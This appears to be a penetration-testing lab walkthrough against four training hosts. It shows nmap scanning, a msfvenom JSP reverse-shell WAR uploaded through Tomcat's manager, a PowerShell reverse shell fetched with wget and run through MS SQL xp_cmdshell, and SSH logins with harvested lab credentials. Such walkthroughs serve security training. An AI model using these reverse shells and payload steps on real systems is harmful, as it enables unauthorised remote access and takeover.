# BB1

## Prework

### Connect to VPN

```bash
sudo openvpn black-box-penetration-test-1.ovpn
```

### Scan network

```bash
sudo nmap -sn 172.16.64.0/24 --exclude 172.16.64.10 -oN hostAlive.nmap &&
cat hostAlive.nmap | grep for | awk {'print $5'} > ips.txt &&
sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml &&
nmap2md.sh portScan.xml | xclip| xclip
```

## Scanner

> Generated on **Sun Jul 11 13:40:33 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
```

## Hosts Alive \(4\)

| Host | OS | Accuracy |
| :--- | :--- | :--- |
| 172.16.64.101 | Linux 3.12 | 95% |
| 172.16.64.140 | Linux 3.12 | 95% |
| 172.16.64.182 | Linux 3.12 | 95% |
| 172.16.64.199 | Microsoft Windows 10 | 96% |

## Open Ports and Running Services

### 172.16.64.101 \(Linux 3.12 - 95%\)

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8080/tcp | open | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 9080/tcp | open | http | Apache Tomcat/Coyote JSP engine 1.1 |
| 59919/tcp | open | http | Apache httpd 2.4.18 |

{% tabs %}
{% tab title="Dirbuster" %}

{% endtab %}

{% tab title="Report" %}
* Target URL: [http://172.16.64.101:8080](http://172.16.64.101:8080)
* File Extension: \* 
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
{% endtab %}
{% endtabs %}

![](../../../.gitbook/assets/dirbuster-101-1.png)

![](../../../.gitbook/assets/dirbuster-101-2.png)

#### Gaining access

{% hint style="info" %}
Trying to access unsuccessfully for a couple of times will get you redirected to [**http://172.16.64.101:8080/host-manager/html**](http://172.16.64.101:8080/host-manager/html), where the following information is shown:

```text
<role rolename="admin-gui"/>
<user username="tomcat" password="s3cret" roles="admin-gui"/>
```

[**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html) ****allows you to upload a war file.
{% endhint %}

#### Generate your reverse shell with `msfvenom`

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=1234 -f war > shell.war
```

```bash
nc -lvp 1234
```

{% hint style="success" %}
**Flag encountered!**

```bash
tomcat8@xubuntu:/home/developer$ cat flag.txt
Congratulations, you got it!
tomcat8@xubuntu:/home/adminels/Desktop$ cat flag.txt 
You did it!
```
{% endhint %}

### 172.16.64.140 \(Linux 3.12 - 95%\)

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 80/tcp | open | http | Apache httpd 2.4.18 |

#### dirbuster

![](../../../.gitbook/assets/dirbuster-140-1.png)

![](../../../.gitbook/assets/dirbuster-140-2.png)

{% hint style="info" %}
**Discovering info**

On this url we find the following connection parameters for a SQL database server: [**http://172.16.64.140:80/project/backup/test/sdadas.txt**](http://172.16.64.140:80/project/backup/test/sdadas.txt):

```text
Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt
```
{% endhint %}

{% hint style="success" %}
**Flag encountered!**

Under [**http://172.16.64.140/project/354253425234234/flag.txt**](http://172.16.64.140/project/354253425234234/flag.txt) we find the following content:

```text
Congratulations, you exploited this machine!
Now continue to others.
```
{% endhint %}

### 172.16.64.182 \(Linux 3.12 - 95%\)

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

{% hint style="info" %}
**We use the credentials we discovered while exploring 172.16.64.199:**

```bash
sshpass -p dF3334slKw ssh developer@172.16.64.182
```
{% endhint %}

{% hint style="success" %}
**Flag encountered**!

```text
sshpass -p dF3334slKw ssh developer@172.16.64.182
developer@xubuntu:~$ find . | grep flag
developer@xubuntu:~$ cat flag.txt 
Congratulations, you got it!
```
{% endhint %}

### 172.16.64.199 \(Microsoft Windows 10 - 96%\)

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds |  |
| 1433/tcp | open | ms-sql-s | Microsoft SQL Server 2014 12.00.2000.00; RTM |
| 49664/tcp | open | msrpc | Microsoft Windows RPC |
| 49665/tcp | open | msrpc | Microsoft Windows RPC |
| 49666/tcp | open | msrpc | Microsoft Windows RPC |
| 49667/tcp | open | msrpc | Microsoft Windows RPC |
| 49668/tcp | open | msrpc | Microsoft Windows RPC |
| 49669/tcp | open | msrpc | Microsoft Windows RPC |
| 49670/tcp | open | msrpc | Microsoft Windows RPC |
| 49943/tcp | open | ms-sql-s | Microsoft SQL Server 2014 12.00.2000 |

#### Attacking MS SQL Server

```bash
# Grab payload
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;

# Substitute ip and port
sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1;

# Encode payload
cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3 | base64 -w 0 > encoded_payload;

# We'll use this payload in our shell
cat encoded_payload 
```

```bash
# Leave nc opened in one terminal
nc -l 1234
```

```bash
# Connect to database server and inject reverse shell via powershell
mssql-cli -S 172.16.64.199 -U fooadmin -P fooadmin
> enable_xp_cmdshell
> RECONFIGURE
> xp_cmdshell whoami
> xp_cmdshell powershell -e <payload_from_previous_step>
```

{% hint style="success" %}
**Flag encountered!**

```text
cd c:\
where /r c:\ flag.txt
cd c:\Users\AdminELS\Desktop\
cat flag.txt
Congratulations! You exploited this machine! 
```
{% endhint %}

{% hint style="info" %}
`ssh://developer:dF3334slKw@172.16.64.182:22` **seems like a ssh connection string:**

```
PS C:\Users\AdminELS\Desktop> cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22############################################################################################################################################################################################
```
{% endhint %}

